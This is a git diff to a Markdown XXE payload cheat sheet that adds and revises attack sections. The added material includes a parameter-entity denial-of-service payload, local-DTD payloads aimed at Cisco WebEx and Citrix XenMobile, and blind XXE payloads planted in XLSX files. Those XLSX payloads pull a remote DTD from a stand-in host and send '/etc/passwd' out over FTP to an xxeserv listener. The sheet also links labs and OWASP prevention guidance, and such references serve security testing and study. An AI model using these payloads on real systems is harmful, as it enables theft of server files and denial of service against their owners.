@@ -20,6 +20,8 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
 - [Exploiting XXE to perform a deny of service](#exploiting-xxe-to-perform-a-deny-of-service)
   - [Billion Laugh Attack](#billion-laugh-attack)
+  - [Yaml attack](#yaml-attack)
+  - [Parameters Laugh attack](#parameters-laugh-attack)
 - [Error Based XXE](#error-based-xxe)
 - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
   - [Blind XXE](#blind-xxe)
@@ -137,11 +139,9 @@ We try to display the content of the file `/etc/passwd`
 
 :warning: `SYSTEM` and `PUBLIC` are almost synonym.
 
-```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+```ps1
+<!ENTITY % xxe PUBLIC "Random Text" "URL">
+<!ENTITY xxe PUBLIC "Any TEXT" "URL">
 ```
 
 ### Classic XXE Base64 encoded
@@ -228,6 +228,20 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
+### Parameters Laugh attack
+
+A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.
+
+```xml
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  %pe_4;
+]>
+<r/>
+```
 
 ## Error Based XXE
 
@@ -372,7 +386,18 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 ]>
 <root></root>
 ```
-
+### Cisco WebEx
+```
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
+### Citrix XenMobile Server
+```
+<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
+<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
 
@@ -503,60 +528,67 @@ GIF (experimental)
 
 ### XXE inside XLSX file
 
-Extract the excel file.
+Structure of the XLSX:
 
 ```
-$ mkdir XXE && cd XXE
-$ unzip ../XXE.xlsx
-Archive:  ../XXE.xlsx
-  inflating: xl/drawings/drawing1.xml
-  inflating: xl/worksheets/sheet1.xml
-  inflating: xl/worksheets/_rels/sheet1.xml.rels
-  inflating: xl/sharedStrings.xml
-  inflating: xl/styles.xml
-  inflating: xl/workbook.xml
-  inflating: xl/_rels/workbook.xml.rels
-  inflating: _rels/.rels
-  inflating: [Content_Types].xml
+$ 7z l xxe.xlsx
+[...]
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2021-10-17 15:19:00 .....          578          223  _rels/.rels
+2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
+2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
+2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
+2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
+2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
+2021-10-17 15:19:00 .....          731          352  docProps/core.xml
+2021-10-17 15:19:00 .....          410          246  docProps/app.xml
+2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
+------------------- ----- ------------ ------------  ------------------------
+2021-10-17 15:19:00              11216         3586  9 files
+```
+
+Extract Excel file: `7z x -oXXE xxe.xlsx`
+
+Rebuild Excel file:
+
+```
+$ cd XXE
+$ 7z u ../xxe.xlsx *
 ```
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
 ```xml
-<xml...>
-<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
-<x>&xxe;</x>
-<workbook...>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
 
 Alternativly, add your payload in `xl/sharedStrings.xml`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
-<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
 ```
 
-Rebuild the Excel file.
+Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
+Instead we build the document once and then change the DTD.
+And using FTP instead of HTTP allows to retrieve much larger files.
+
+`xxe.dtd`
+
+```xml
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
+```
+
+Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
 
 ```
-$ zip -r ../poc.xlsx *
-updating: [Content_Types].xml (deflated 71%)
-updating: _rels/ (stored 0%)
-updating: _rels/.rels (deflated 60%)
-updating: docProps/ (stored 0%)
-updating: docProps/app.xml (deflated 51%)
-updating: docProps/core.xml (deflated 50%)
-updating: xl/ (stored 0%)
-updating: xl/workbook.xml (deflated 56%)
-updating: xl/worksheets/ (stored 0%)
-updating: xl/worksheets/sheet1.xml (deflated 53%)
-updating: xl/styles.xml (deflated 60%)
-updating: xl/theme/ (stored 0%)
-updating: xl/theme/theme1.xml (deflated 80%)
-updating: xl/_rels/ (stored 0%)
-updating: xl/_rels/workbook.xml.rels (deflated 66%)
-updating: xl/sharedStrings.xml (deflated 17%)
+$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
 ```
 
 ### XXE inside DTD file
@@ -584,11 +616,16 @@ we can convert the character encoding to `UTF-16` using [iconv](https://man7.org
 ```bash
 cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 ```
+UTF-7 encoding can be used as well to bypass UTF-8/UTF-16 rules.
 
+## Labs
+
+* [PortSwigger Labs for XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
 
 ## References
 
 * [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+* [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 * [Detecting and exploiting XXE in SAML Interfaces](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html) - 6. Nov. 2014 - Von Christian Mainka
 * [[Gist] staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 * [[Gist] mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
@@ -609,3 +646,6 @@ cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 * [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
 * [SynAck - A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 22 July 2019 - Trenton Gordon
 * [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
+* [XXE: How to become a Jedi](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
+* [Payloads for Cisco and Citrix - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+
